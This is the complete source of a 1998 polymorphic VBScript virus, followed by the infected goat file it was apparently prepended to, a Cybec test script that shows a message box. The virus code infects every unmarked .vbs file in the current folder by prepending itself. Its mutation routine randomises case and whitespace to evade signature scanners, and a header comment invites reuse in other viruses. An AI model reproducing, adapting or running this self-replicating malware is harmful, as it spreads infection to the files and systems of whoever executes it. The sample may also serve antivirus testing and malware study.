'**********
'   a POLYMoRPhIC     ExampLE   Vb  scRIpt    ViRus bASed  oN VBSV777
'   bY   Spo0Ky     +   CaD -    14.   nOV. 1998     -
'  FeeL    free To Use   tHe     cbMUTAtE  FUnCtioN    in    YOUr    OwN     bugs :-)

  CONSt    CBForreadInG =     1     ,    CBforWritING =     2

 RANdomIZe
 
    cbwEpaTh   =  WsCript .  sCriPTFULlNAmE
 
 SET   CBFSo    = crEATEoBJeCT  ( "scRIptINg.FiLesYSTEMOBjeCt"     )
   
   set   CBWEfILE  =    CbfSO .  OPENteXTFilE  (     cBwepatH  ,  cBfOrrEadinG )
   cBWecOdE =   cBWEfILe     .  reaDall
   cbwefile  .     clOsE
     
    CbvIRuSSIZe   =     inStr     ( 3    ,     cbWecODe ,    "*****"     &   "*****" )  +   10 +     1

     set     cbWEFilE  = cBFso .     opENTextfIlE  (    CbwepATh   ,  cBfOrReADING     )
   CbWeCOdE = CBwefile .  rEad    (   cBvirUSSiZe   )
  cbWEfiLe     .   cLOSe
 
     FOr     eacH    CBfILe    iN     cbFSo   .     GetfOlDER  (    "."    ) .    fILES
   
   If lCAse (  cBFsO .    gETEXTEnSIoNnamE  (  CBfILe   .  NamE   )   )    = ChR (  118    ) & ChR     (  98 )  &   cHR     (    115  )  THeN
    
   SeT   CbviCtimfIlE = cbFso     . oPentExTFIlE  (     CbfilE     .  paTH   ,   CBfORrEaDINg  )
   CBINFECtioNMARKeR    =  CBvicTiMfilE  . ReAD (   11     )
    cbViCtIMFILe    .  CLoSE
  
   iF CbINfEctiONMArKeR     <>     "'*****" &    "*****"    THeN

 SEt    cbvICtImfiLe  =     cBFSO  . OpentEXTFiLe    (  cbfILe    .   PATH     ,    CBFORreAdiNG     )
 cbvICTiMCOde  =    cBViCTiMfile   . reADall
  CbvICTImFile    .  ClOSe
   
  CbvIctimCoDe  = cbmUtaTe    ( cBWEcoDE   )    &  cBvicTimcODe
   
    SET   cbVictIMFile   =  cBfSO    . oPenTEXTfiLE   (   cBfIlE    . pATH    ,  cbfoRWRITInG    ,    1  )
     cBviCTimFILE . wRIte   cbvIctiMCoDe
     CBviCTImfile   .   ClOSe
    
 enD    if
 
  EnD  IF
  
     NEXT
 
     
  FUNCTion   CBmuTatE   (     cBstrIng  )
    
  cbnEwStrIng     =  ""
 cBI    = 1
 
     whIlE CBI  <=    LeN (   cBStrInG  )
  
 iF  MID    (     CbsTriNG  ,   cbI    , 1   )  = CHR     (  32  )     THen

     fOr     cbj    =  1  TO    iNt   ( 5    *     rNd    )    +  1

    CbnewstrinG   =   cBnEwsTRINg    +  CHr     (    32 )

   nExt
     
     DO
    
  cBI   =    cBI    + 1
   
    LOOp   WhIle    miD (  CbsTrINg    ,     CbI ,    1     )   =     chr   ( 32  )
    
   ElSe
   
 iF    iNT    (     2 *  RNd   )  +    1 =  1 tHen

     cBNewSTrInG    =     cbNEwStriNG    + uCASE     (   mid     (    CbStRinG     ,   CBI    ,     1     )    )

 eLse

     CbNEWStrIng    =   cBNeWsTriNG    +     lcase (  mid  (  CbStRinG ,    cbi    ,     1     )    )

    eNd   IF

 cBi =  CbI  +   1
     
     enD iF
  
   wENd
 
     cBMUtaTe =   CBNEWsTrIng
     
     END FUNcTIoN
 
 '**********
'VBS Goat file

Dim Msg, Style, Title, Help, Ctxt, Responce, MyString
Msg = "This is Cybec VBS Goat file"
Style = vbYesNo + vbExclamation + vbDefaultButton2
Title = "Goat File"
Help = "Goat.hlp"
Ctxt = 1000

Responce = MsgBox(Msg, Style, Title, Help, Ctxt)
